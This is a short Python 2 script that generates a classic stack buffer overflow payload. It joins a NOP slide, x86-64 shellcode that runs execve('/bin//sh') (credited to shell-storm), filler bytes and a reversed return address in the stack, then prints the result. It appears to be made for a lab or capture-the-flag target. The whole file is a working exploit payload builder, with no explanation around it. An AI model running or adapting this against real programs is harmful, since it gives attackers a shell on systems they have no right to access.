#!/usr/bin/python

nop_length = 100
nop_slide = "\x90" * nop_length

# the shell code is from http://shell-storm.org/shellcode/files/shellcode-806.php
shell_code = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload_len = 536
#target_addr = "\x00\x00\x7f\xff\xff\xff\xda\x00"
target_addr = "\x00\x00\x7f\xff\xff\xff\xda\x70"

payload = nop_slide + shell_code + 'A'*(payload_len - len(shell_code) - len(nop_slide)) + target_addr[::-1]

print payload

